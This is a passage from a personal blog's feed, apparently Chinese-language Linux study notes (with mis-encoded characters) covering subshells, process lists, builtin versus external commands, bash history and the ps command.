//åˆ›å»ºå­shell</span>root@VM-16-11-debian:~<span class="token comment"># bash  //å­shellä¸­åˆ›å»ºå­shell</span>root@VM-16-11-debian:~<span class="token comment"># bash</span>root@VM-16-11-debian:~<span class="token comment"># ps --forest</span>  PID TTY          TIME CMD <span class="token number">8068</span> pts/0    00:00:00 <span class="token function">bash</span><span class="token number">14850</span> pts/0    00:00:00  <span class="token punctuation">\</span>_ <span class="token function">bash</span><span class="token number">14858</span> pts/0    00:00:00      <span class="token punctuation">\</span>_ <span class="token function">bash</span><span class="token number">14861</span> pts/0    00:00:00          <span class="token punctuation">\</span>_ <span class="token function">bash</span><span class="token number">14994</span> pts/0    00:00:00              <span class="token punctuation">\</span>_ <span class="token function">ps</span>root@VM-16-11-debian:~<span class="token comment"># exit</span><span class="token builtin class-name">exit</span>  //exité€€å‡ºshellroot@VM-16-11-debian:~<span class="token comment"># exit</span><span class="token builtin class-name">exit</span>root@VM-16-11-debian:~<span class="token comment"># exit</span><span class="token builtin class-name">exit</span>root@VM-16-11-debian:~<span class="token comment"># ps -f</span><span class="token environment constant">UID</span>        PID  <span class="token environment constant">PPID</span>  C STIME TTY          TIME CMDroot      <span class="token number">8068</span>  <span class="token number">8050</span>  <span class="token number">0</span> <span class="token number">19</span>:48 pts/0    00:00:00 -bashroot     <span class="token number">15204</span>  <span class="token number">8068</span>  <span class="token number">0</span> <span class="token number">20</span>:17 pts/0    00:00:00 <span class="token function">ps</span> -f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¾“å…¥å‘½ä»¤bashä¹‹åï¼Œä¸€ä¸ªå­shellå°±å‡ºç°äº†ã€‚ç¬¬äºŒä¸ªps -fæ˜¯åœ¨å­shellä¸­æ‰§è¡Œçš„ã€‚å¯ä»¥ä»æ˜¾ç¤ºç»“æœä¸­çœ‹åˆ°æœ‰ä¸¤ä¸ªbash shellç¨‹åºåœ¨è¿è¡Œã€‚ç¬¬ä¸€ä¸ªbash shellç¨‹åºï¼Œä¹Ÿå°±æ˜¯çˆ¶shellè¿›ç¨‹ï¼Œå…¶åŸå§‹è¿›ç¨‹IDæ˜¯1814ã€‚ç¬¬äºŒä¸ªbash shellç¨‹åºï¼Œ å³å­shellè¿›ç¨‹ï¼Œå…¶PIDæ˜¯2430ã€‚æ³¨æ„ï¼Œå­shellçš„<strong>çˆ¶è¿›ç¨‹IDï¼ˆ PPIDï¼‰æ˜¯1841</strong>ï¼ŒæŒ‡æ˜äº†<strong>è¿™ä¸ªçˆ¶shellè¿›ç¨‹å°±æ˜¯è¯¥å­shellçš„çˆ¶è¿›ç¨‹</strong>ã€‚  </p><img src="E:\myblog\source\_posts\Linuxå­¦ä¹ -ç¬¬äº”ç« .assets\5.1.png" style="zoom:150%;"><h4 id="5-2-1-è¿›ç¨‹åˆ—è¡¨"><a href="#5-2-1-è¿›ç¨‹åˆ—è¡¨" class="headerlink" title="5.2.1 è¿›ç¨‹åˆ—è¡¨"></a>5.2.1 è¿›ç¨‹åˆ—è¡¨</h4><p>å‘½ä»¤ä¹‹é—´åŠ å…¥åˆ†å·ï¼ˆ ;ï¼‰å¯ä»¥ä¾æ¬¡è¿è¡Œçš„ä¸€ç³»åˆ—å‘½ä»¤ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># pwd ; ls ; cd /etc ; pwd </span>/rootdisk.sh  install.sh  <span class="token function">mc</span>/etc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸è¿‡è¿™å¹¶ä¸æ˜¯è¿›ç¨‹åˆ—è¡¨ã€‚å‘½ä»¤åˆ—è¡¨è¦æƒ³æˆä¸ºè¿›ç¨‹åˆ—è¡¨ï¼Œè¿™äº›å‘½ä»¤<font color="#FF5E3A" size="3">å¿…é¡»åŒ…å«åœ¨æ‹¬å·é‡Œ</font>ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment">#(pwd ; ls ; cd /etc ; pwd )</span>/rootdisk.sh  install.sh  <span class="token function">mc</span>/etc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è™½ç„¶ç»“æœæ²¡æœ‰ä¸åŒä½†æ˜¯æ‹¬å·çš„åŠ å…¥ä½¿å‘½ä»¤åˆ—è¡¨å˜æˆäº†è¿›ç¨‹åˆ—è¡¨ï¼Œ<font color="#FF5E3A" size="3">ç”Ÿæˆäº†ä¸€ä¸ªå­shellæ¥æ‰§è¡Œå¯¹åº”çš„å‘½ä»¤</font>ã€‚  </p><p>è¦æƒ³çŸ¥é“æ˜¯å¦ç”Ÿæˆäº†å­shellï¼Œå¾—<strong>å€ŸåŠ©ä¸€ä¸ªä½¿ç”¨äº†ç¯å¢ƒå˜é‡çš„å‘½ä»¤</strong>ã€‚ï¼ˆç¯å¢ƒå˜é‡ä¼šåœ¨ç¬¬6ç« ä¸­è¯¦è¿°ã€‚ï¼‰è¿™ä¸ªå‘½ä»¤å°±æ˜¯<code>echo $BASH_SUBSHELL</code>ã€‚å¦‚æœè¯¥å‘½ä»¤è¿”å›0ï¼Œå°±è¡¨æ˜æ²¡æœ‰å­shellã€‚å¦‚æœè¿”å›<strong>1æˆ–è€…å…¶ä»–æ›´å¤§çš„æ•°å­—</strong>ï¼Œå°±è¡¨æ˜å­˜åœ¨å­shellã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># (pwd ; ls ; cd /etc ; pwd; echo $BASH_SUBSHELL)</span>/rootdisk.sh  install.sh  <span class="token function">mc</span>/etc<span class="token number">1</span><span class="token comment">#åµŒå¥—</span>$ <span class="token punctuation">(</span> <span class="token builtin class-name">pwd</span> <span class="token punctuation">;</span> <span class="token punctuation">(</span>echo <span class="token variable">$BASH_SUBSHELL</span><span class="token punctuation">))</span>/home/Christine<span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨shellè„šæœ¬ä¸­ï¼Œç»å¸¸ä½¿ç”¨å­shellè¿›è¡Œå¤šè¿›ç¨‹å¤„ç†ã€‚ä½†æ˜¯é‡‡ç”¨å­shellçš„æˆæœ¬ä¸è²ï¼Œä¼šæ˜æ˜¾æ‹–æ…¢å¤„ç†é€Ÿåº¦ã€‚åœ¨äº¤äº’å¼çš„CLI shellä¼šè¯ä¸­ï¼Œå­shellåŒæ ·å­˜åœ¨é—®é¢˜ã€‚å®ƒ<strong>å¹¶éçœŸæ­£çš„å¤šè¿›ç¨‹å¤„ç†</strong>ï¼Œå› ä¸ºç»ˆç«¯æ§åˆ¶ç€å­shellçš„I/Oã€‚  </p><h3 id="5-3-ç†è§£-shell-çš„å†…å»ºå‘½ä»¤"><a href="#5-3-ç†è§£-shell-çš„å†…å»ºå‘½ä»¤" class="headerlink" title="5.3 ç†è§£ shell çš„å†…å»ºå‘½ä»¤"></a>5.3 ç†è§£ shell çš„å†…å»ºå‘½ä»¤</h3><h4 id="5-3-1-å¤–éƒ¨å‘½ä»¤-éå†…å»ºå‘½ä»¤"><a href="#5-3-1-å¤–éƒ¨å‘½ä»¤-éå†…å»ºå‘½ä»¤" class="headerlink" title="5.3.1 å¤–éƒ¨å‘½ä»¤ (éå†…å»ºå‘½ä»¤)"></a>5.3.1 å¤–éƒ¨å‘½ä»¤ (éå†…å»ºå‘½ä»¤)</h4><p>å¤–éƒ¨å‘½ä»¤ï¼Œæœ‰æ—¶å€™ä¹Ÿè¢«ç§°ä¸º<strong>æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤</strong>ï¼Œæ˜¯<strong>å­˜åœ¨äºbash shellä¹‹å¤–çš„ç¨‹åº</strong>ã€‚å®ƒä»¬å¹¶ä¸æ˜¯shellç¨‹åºçš„ä¸€éƒ¨åˆ†ã€‚å¤–éƒ¨å‘½ä»¤ç¨‹åºé€šå¸¸ä½äº/binã€ /usr/binã€ /sbinæˆ–/usr/sbinä¸­ã€‚<br>pså°±æ˜¯ä¸€ä¸ªå¤–éƒ¨å‘½ä»¤ã€‚ä½ å¯ä»¥ä½¿ç”¨whichå’Œtypeå‘½ä»¤æ‰¾åˆ°å®ƒã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># which ps</span>/usr/bin/ps<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><font color="#FF5E3A" size="3">å½“å¤–éƒ¨å‘½ä»¤æ‰§è¡Œæ—¶ï¼Œä¼šåˆ›å»ºå‡ºä¸€ä¸ªå­è¿›ç¨‹</font>ã€‚è¿™ç§æ“ä½œè¢«ç§°ä¸ºè¡ç”Ÿï¼ˆ forkingï¼‰ã€‚å¤–éƒ¨å‘½ä»¤pså¾ˆæ–¹ä¾¿æ˜¾ç¤ºå‡ºå®ƒçš„çˆ¶è¿›ç¨‹ä»¥åŠè‡ªå·±æ‰€å¯¹åº”çš„è¡ç”Ÿå­è¿›ç¨‹ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># ps -f</span><span class="token environment constant">UID</span>        PID  <span class="token environment constant">PPID</span>  C STIME TTY          TIME CMDroot     <span class="token number">10004</span>  <span class="token number">9998</span>  <span class="token number">0</span> <span class="token number">15</span>:09 pts/1    00:00:00 -bashroot     <span class="token number">11078</span> <span class="token number">10004</span>  <span class="token number">0</span> <span class="token number">15</span>:13 pts/1    00:00:00 <span class="token function">ps</span> -f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux5/202202051550062.png" alt="å¤–éƒ¨å‘½ä»¤æ‰§è¡Œæ—¶çš„è¡ç”Ÿè¿‡ç¨‹"></p><h4 id="5-3-2-å†…å»ºå‘½ä»¤"><a href="#5-3-2-å†…å»ºå‘½ä»¤" class="headerlink" title="5.3.2 å†…å»ºå‘½ä»¤"></a>5.3.2 å†…å»ºå‘½ä»¤</h4><p>å†…å»ºå‘½ä»¤å’Œå¤–éƒ¨å‘½ä»¤çš„åŒºåˆ«åœ¨äºå‰è€…ä¸éœ€è¦ä½¿ç”¨å­è¿›ç¨‹æ¥æ‰§è¡Œã€‚<font color="#FF5E3A" size="3">å®ƒä»¬å·²ç»å’Œshellç¼–è¯‘æˆäº†ä¸€ä½“ï¼Œä½œä¸ºshellå·¥å…·çš„ç»„æˆéƒ¨åˆ†å­˜åœ¨</font>ã€‚ä¸éœ€è¦å€ŸåŠ©å¤–éƒ¨ç¨‹åºæ–‡ä»¶æ¥è¿è¡Œã€‚  </p><p><code>cd</code>å’Œ<code>exit</code>å‘½ä»¤éƒ½å†…å»ºäºbash shellã€‚å¯ä»¥<font color="#FF5E3A" size="3">åˆ©ç”¨<code>type</code>å‘½ä»¤æ¥äº†è§£æŸä¸ªå‘½ä»¤æ˜¯å¦æ˜¯å†…å»ºçš„</font>ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># type cd</span><span class="token builtin class-name">cd</span> is a shell <span class="token builtin class-name">builtin</span>root@VM-16-11-debian:~<span class="token comment"># type exit</span><span class="token builtin class-name">exit</span> is a shell <span class="token builtin class-name">builtin</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æœ‰äº›å‘½ä»¤æœ‰å¤šç§å®ç°ã€‚ä¾‹å¦‚echoå’Œpwdæ—¢æœ‰å†…å»ºå‘½ä»¤ä¹Ÿæœ‰å¤–éƒ¨å‘½ä»¤ã€‚ä¸¤ç§å®ç°ç•¥æœ‰ä¸åŒã€‚è¦æŸ¥çœ‹å‘½ä»¤çš„ä¸åŒå®ç°ï¼Œä½¿ç”¨typeå‘½ä»¤çš„<code>-a</code>é€‰é¡¹ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">type</span> -a <span class="token builtin class-name">echo</span><span class="token builtin class-name">echo</span> is a shell <span class="token builtin class-name">builtin</span><span class="token builtin class-name">echo</span> is /bin/echo$$ <span class="token function">which</span> <span class="token builtin class-name">echo</span>/bin/echo$$ <span class="token builtin class-name">type</span> -a <span class="token builtin class-name">pwd</span><span class="token builtin class-name">pwd</span> is a shell <span class="token builtin class-name">builtin</span><span class="token builtin class-name">pwd</span> is /bin/pwd$$ <span class="token function">which</span> <span class="token builtin class-name">pwd</span>/bin/pwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>which</code>å‘½ä»¤<strong>åªæ˜¾ç¤ºå‡ºäº†å¤–éƒ¨å‘½ä»¤æ–‡ä»¶</strong>ã€‚  </p><h5 id="5-3-2-1-ä½¿ç”¨historyå‘½ä»¤"><a href="#5-3-2-1-ä½¿ç”¨historyå‘½ä»¤" class="headerlink" title="5.3.2.1 ä½¿ç”¨historyå‘½ä»¤"></a>5.3.2.1 ä½¿ç”¨historyå‘½ä»¤</h5><p>ä¸€ä¸ªæœ‰ç”¨çš„å†…å»ºå‘½ä»¤æ˜¯<code>history</code>å‘½ä»¤ã€‚ bash shellä¼šè·Ÿè¸ªä½ ç”¨è¿‡çš„å‘½ä»¤ã€‚ä½ å¯ä»¥å”¤å›è¿™äº›å‘½ä»¤å¹¶é‡æ–°ä½¿ç”¨ã€‚  </p><p>æŸ¥çœ‹æœ€è¿‘ç”¨è¿‡çš„å‘½ä»¤åˆ—è¡¨ï¼Œå¯ä»¥è¾“å…¥ä¸å¸¦é€‰é¡¹çš„historyå‘½ä»¤ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">history</span><span class="token number">1</span> <span class="token function">ps</span> -f<span class="token number">2</span> <span class="token builtin class-name">pwd</span><span class="token number">3</span> <span class="token function">ls</span><span class="token number">4</span> coproc <span class="token punctuation">(</span> <span class="token function">sleep</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token function">sleep</span> <span class="token number">2</span> <span class="token punctuation">)</span><span class="token number">5</span> <span class="token function">jobs</span><span class="token number">6</span> <span class="token function">ps</span> --forest<span class="token number">7</span> <span class="token function">ls</span><span class="token number">8</span> <span class="token function">ps</span> -f<span class="token number">9</span> <span class="token builtin class-name">pwd</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€šå¸¸å†å²è®°å½•ä¸­ä¼šä¿å­˜æœ€è¿‘çš„1000æ¡å‘½ä»¤ã€‚  ä¸åŒçš„ç³»ç»Ÿé…ç½®å¯èƒ½ä¸ä¸€æ ·ï¼Œå¯ä»¥é€šè¿‡<code>HISTSIZE</code>ç¯å¢ƒå˜é‡æŸ¥çœ‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># echo $HISTSIZE</span><span class="token number">3000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¾“å…¥<code>!!</code>ï¼Œç„¶åæŒ‰å›è½¦é”®å°±èƒ½å¤Ÿå”¤å‡ºåˆšåˆšç”¨è¿‡çš„é‚£æ¡å‘½ä»¤æ¥ä½¿ç”¨:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># ps</span>  PID TTY          TIME CMD<span class="token number">17661</span> pts/2    00:00:00 <span class="token function">bash</span><span class="token number">18051</span> pts/2    00:00:00 <span class="token function">ps</span>root@VM-16-11-debian:~<span class="token comment"># !!</span><span class="token function">ps</span>  PID TTY          TIME CMD<span class="token number">17661</span> pts/2    00:00:00 <span class="token function">bash</span><span class="token number">18063</span> pts/2    00:00:00 <span class="token function">ps</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“è¾“å…¥!!æ—¶ï¼Œ bashé¦–å…ˆä¼šæ˜¾ç¤ºå‡ºä»shellçš„å†å²è®°å½•ä¸­å”¤å›çš„å‘½ä»¤ã€‚ç„¶åæ‰§è¡Œè¯¥å‘½ä»¤ã€‚  </p><p>å‘½ä»¤å†å²è®°å½•è¢«ä¿å­˜åœ¨éšè—æ–‡ä»¶.bash_historyä¸­ï¼Œå®ƒä½äºç”¨æˆ·çš„ä¸»ç›®å½•ä¸­ã€‚è¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œ<font color="#FF5E3A" size="3">bashå‘½ä»¤çš„å†å²è®°å½•æ˜¯å…ˆå­˜æ”¾åœ¨å†…å­˜ä¸­ï¼Œå½“shellé€€å‡ºæ—¶æ‰è¢«å†™å…¥åˆ°å†å²æ–‡ä»¶ä¸­</font>ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">history</span><span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span><span class="token number">25</span> <span class="token function">ps</span> --forest<span class="token number">26</span> <span class="token function">history</span><span class="token number">27</span> <span class="token function">ps</span> --forest<span class="token number">28</span> <span class="token function">history</span>$$ <span class="token function">cat</span> .bash_history<span class="token builtin class-name">pwd</span><span class="token function">ls</span><span class="token function">history</span><span class="token builtin class-name">exit</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥å”¤å›å†å²åˆ—è¡¨ä¸­ä»»æ„ä¸€æ¡å‘½ä»¤ã€‚åªéœ€è¾“å…¥æ„Ÿå¹å·ï¼ˆ!ï¼‰å’Œå‘½ä»¤åœ¨å†å²åˆ—è¡¨ä¸­çš„ç¼–å·å³å¯ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">history</span><span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span><span class="token number">16</span> <span class="token builtin class-name">type</span> <span class="token builtin class-name">pwd</span><span class="token number">17</span> <span class="token function">which</span> <span class="token builtin class-name">pwd</span><span class="token number">18</span> <span class="token builtin class-name">type</span> <span class="token builtin class-name">echo</span><span class="token number">19</span> <span class="token function">which</span> <span class="token builtin class-name">echo</span><span class="token number">20</span> <span class="token builtin class-name">type</span> -a <span class="token builtin class-name">pwd</span><span class="token number">21</span> <span class="token builtin class-name">type</span> -a <span class="token builtin class-name">echo</span><span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span><span class="token number">32</span> <span class="token function">history</span> -a<span class="token number">33</span> <span class="token function">history</span>$ <span class="token operator">!</span><span class="token number">20</span><span class="token builtin class-name">type</span> -a <span class="token builtin class-name">pwd</span><span class="token builtin class-name">pwd</span> is a shell <span class="token builtin class-name">builtin</span><span class="token builtin class-name">pwd</span> is /bin/pwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p><font color="#FF9999" size="3">æ–‡ç« å‚è€ƒï¼šLinuxå‘½ä»¤è¡Œä¸shellè„šæœ¬ç¼–ç¨‹å¤§å…¨.ç¬¬3ç‰ˆ by å¸ƒé²å§†ï¼Œå¸ƒé›·æ–¯çº³æ±‰ (z-lib.org)</font></p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux5/202202051442832.jpg" style="zoom:150%;">]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="å­¦ä¹ " scheme="https://huhu-myh.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="linux" scheme="https://huhu-myh.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Linuxå­¦ä¹ -ç¬¬å››ç« </title>
    <link href="https://huhu-myh.github.io/posts/myh10010.html"/>
    <id>https://huhu-myh.github.io/posts/myh10010.html</id>
    <published>2022-01-22T08:37:01.000Z</published>
    <updated>2022-02-07T01:19:52.777Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="ç¬¬å››ç« ï¼šè¿›é˜¶bash-shellå‘½ä»¤"><a href="#ç¬¬å››ç« ï¼šè¿›é˜¶bash-shellå‘½ä»¤" class="headerlink" title="ç¬¬å››ç« ï¼šè¿›é˜¶bash shellå‘½ä»¤"></a>ç¬¬å››ç« ï¼šè¿›é˜¶bash shellå‘½ä»¤</h2><h3 id="4-1-ç›‘æµ‹ç¨‹åº"><a href="#4-1-ç›‘æµ‹ç¨‹åº" class="headerlink" title="4.1 ç›‘æµ‹ç¨‹åº"></a>4.1 ç›‘æµ‹ç¨‹åº</h3><h4 id="4-1-1-æ¢æŸ¥è¿›ç¨‹"><a href="#4-1-1-æ¢æŸ¥è¿›ç¨‹" class="headerlink" title="4.1.1 æ¢æŸ¥è¿›ç¨‹"></a>4.1.1 æ¢æŸ¥è¿›ç¨‹</h4><p>åœ¨è®²æ¢æŸ¥è¿›ç¨‹ä¹‹å‰å…ˆè¯´æ˜ä¸€ä¸‹ä»€ä¹ˆæ˜¯è¿›ç¨‹ã€‚<font color="#FF5E3A" size="3">è¿›ç¨‹ï¼šè¿è¡Œåœ¨ç³»ç»Ÿä¸Šçš„ç¨‹åºã€‚</font>è¦ç›‘æµ‹è¿™äº›è¿›ç¨‹ï¼Œéœ€è¦ç†Ÿæ‚‰<code>pså‘½ä»¤</code>çš„ç”¨æ³•ã€‚ pså‘½ä»¤å¥½æ¯”å·¥å…·ä¸­çš„ç‘å£«å†›åˆ€ï¼Œå®ƒèƒ½è¾“å‡ºè¿è¡Œåœ¨ç³»ç»Ÿä¸Šçš„æ‰€æœ‰ç¨‹åºçš„è®¸å¤šä¿¡æ¯ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># ps</span>  PID TTY          TIME CMD<span class="token number">26084</span> pts/0    00:00:00 <span class="token function">bash</span><span class="token number">26098</span> pts/0    00:00:00 <span class="token function">ps</span><span class="token comment">#PID : Process ID,æ˜¾ç¤ºäº†å½“å‰ç¨‹åºçš„è¿›ç¨‹ID</span><span class="token comment">#TTY : å±äºå“ªä¸ªç»ˆç«¯</span><span class="token comment">#TIME: è¿è¡Œçš„æ—¶é•¿</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œ pså‘½ä»¤åªä¼šæ˜¾ç¤ºè¿è¡Œåœ¨å½“å‰æ§åˆ¶å°ä¸‹çš„å±äºå½“å‰ç”¨æˆ·çš„è¿›ç¨‹ã€‚  æ­¤ä¾‹æˆ‘ä»¬åªè¿è¡Œäº†bash shellï¼ˆæ³¨æ„ï¼Œ <font color="#FF5E3A" size="3">shellä¹Ÿåªæ˜¯è¿è¡Œåœ¨ç³»ç»Ÿä¸Šçš„å¦ä¸€ä¸ªç¨‹åºè€Œå·²</font>ï¼‰ä»¥åŠpså‘½ä»¤æœ¬èº«ã€‚  ä¸‹é¢è®²è§£ä¸€ä¸‹<code>ps</code>å‘½ä»¤å¯¹åº”çš„éƒ¨åˆ†å‚æ•°åŠå…¶ä½œç”¨:</p><table><thead><tr><th align="center">å‚æ•°</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">-A</td><td align="center">æ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹</td></tr><tr><td align="center">-N</td><td align="center">æ˜¾ç¤ºä¸æŒ‡å®šå‚æ•°<font color="#FF5E3A" size="3">ä¸ç¬¦</font>çš„æ‰€æœ‰è¿›ç¨‹</td></tr><tr><td align="center">-a</td><td align="center">æ˜¾ç¤ºé™¤æ§åˆ¶è¿›ç¨‹ï¼ˆ session leaderï¼‰å’Œæ— ç»ˆç«¯è¿›ç¨‹å¤–çš„æ‰€æœ‰è¿›ç¨‹</td></tr><tr><td align="center">-d</td><td align="center">æ˜¾ç¤ºé™¤æ§åˆ¶è¿›ç¨‹å¤–çš„æ‰€æœ‰è¿›ç¨‹</td></tr><tr><td align="center">-e</td><td align="center">æ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹</td></tr><tr><td align="center">-c</td><td align="center">æ˜¾ç¤ºè¿›ç¨‹çš„é¢å¤–è°ƒåº¦å™¨ä¿¡æ¯</td></tr><tr><td align="center">-f</td><td align="center">æ˜¾ç¤ºå®Œæ•´æ ¼å¼çš„è¾“å‡º</td></tr><tr><td align="center">-l</td><td align="center">æ˜¾ç¤ºé•¿åˆ—è¡¨</td></tr></tbody></table><p>å‘½ä»¤å‚æ•°è¿˜æœ‰å¾ˆå¤šï¼Œä¹Ÿä¸éœ€è¦éƒ½è®°ä½ï¼Œåªéœ€è¦è®°ä½æœ€å¸¸ç”¨çš„å°±å¥½ã€‚ç»å¸¸æŠŠå‚æ•°ç»„åˆèµ·æ¥ç”¨æ˜¯ä¸é”™çš„æ–¹æ³•ï¼Œæ¯”å¦‚<code>-ef</code>å‘½ä»¤ï¼Œå¯ä»¥æŸ¥çœ‹ç³»ç»Ÿä¸Šè¿è¡Œçš„æ‰€æœ‰è¿›ç¨‹å¹¶ä¸”æ˜¾ç¤ºä¸€äº›ç»å¸¸éœ€è¦çš„ä¿¡æ¯ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># ps -ef</span><span class="token environment constant">UID</span>        PID  <span class="token environment constant">PPID</span>  C STIME TTY          TIME CMDroot         <span class="token number">1</span>     <span class="token number">0</span>  <span class="token number">0</span> Jan21 ?        00:00:02 /sbin/initroot         <span class="token number">2</span>     <span class="token number">0</span>  <span class="token number">0</span> Jan21 ?        00:00:00 <span class="token punctuation">[</span>kthreadd<span class="token punctuation">]</span>root         <span class="token number">3</span>     <span class="token number">2</span>  <span class="token number">0</span> Jan21 ?        00:00:00 <span class="token punctuation">[</span>rcu_gp<span class="token punctuation">]</span>root         <span class="token number">4</span>     <span class="token number">2</span>  <span class="token number">0</span> Jan21 ?        00:00:00 <span class="token punctuation">[</span>rcu_par_gp<span class="token punctuation">]</span>root         <span class="token number">6</span>     <span class="token number">2</span>  <span class="token number">0</span> Jan21 ?        00:00:00 <span class="token punctuation">[</span>kworker/0:0H-kblockd<span class="token punctuation">]</span>root         <span class="token number">7</span>     <span class="token number">2</span>  <span class="token number">0</span> Jan21 ?        00:00:00 <span class="token punctuation">[</span>kworker/u4:0-events_unbound<span class="token punctuation">]</span>root         <span class="token number">8</span>     <span class="token number">2</span>  <span class="token number">0</span> Jan21 ?        00:00:00 <span class="token punctuation">[</span>mm_percpu_wq<span class="token punctuation">]</span>root         <span class="token number">9</span>     <span class="token number">2</span>  <span class="token number">0</span> Jan21 ?        00:00:01 <span class="token punctuation">[</span>ksoftirqd/0<span class="token punctuation">]</span>root        <span class="token number">10</span>     <span class="token number">2</span>  <span class="token number">0</span> Jan21 ?        00:00:29 <span class="token punctuation">[</span>rcu_sched<span class="token punctuation">]</span>root        <span class="token number">11</span>     <span class="token number">2</span>  <span class="token number">0</span> Jan21 ?        00:00:00 <span class="token punctuation">[</span>rcu_bh<span class="token punctuation">]</span>â€¦â€¦<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li> UIDï¼šå¯åŠ¨è¿™äº›è¿›ç¨‹çš„ç”¨æˆ·ã€‚</li><li> PIDï¼šè¿›ç¨‹çš„è¿›ç¨‹IDã€‚</li><li> PPIDï¼šçˆ¶è¿›ç¨‹çš„è¿›ç¨‹å·ï¼ˆå¦‚æœè¯¥è¿›ç¨‹æ˜¯ç”±å¦ä¸€ä¸ªè¿›ç¨‹å¯åŠ¨çš„ï¼‰ã€‚</li><li> Cï¼šè¿›ç¨‹ç”Ÿå‘½å‘¨æœŸä¸­çš„CPUåˆ©ç”¨ç‡ã€‚</li><li> STIMEï¼šè¿›ç¨‹å¯åŠ¨æ—¶çš„ç³»ç»Ÿæ—¶é—´ã€‚</li><li> TTYï¼šè¿›ç¨‹å¯åŠ¨æ—¶çš„ç»ˆç«¯è®¾å¤‡ã€‚</li><li> TIMEï¼šè¿è¡Œè¿›ç¨‹éœ€è¦çš„ç´¯è®¡CPUæ—¶é—´ã€‚</li><li> CMDï¼šå¯åŠ¨çš„ç¨‹åºåç§°  </li></ul><p>å¦‚æœéœ€è¦æ›´å¤šä¿¡æ¯ä½¿ç”¨<code>-l</code>å‚æ•°ï¼Œä¹Ÿå¯ä»¥ç»“åˆä½¿ç”¨ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># ps -le</span>F S   <span class="token environment constant">UID</span>   PID  <span class="token environment constant">PPID</span>  C PRI  NI ADDR SZ WCHAN  TTY          TIME CMD<span class="token 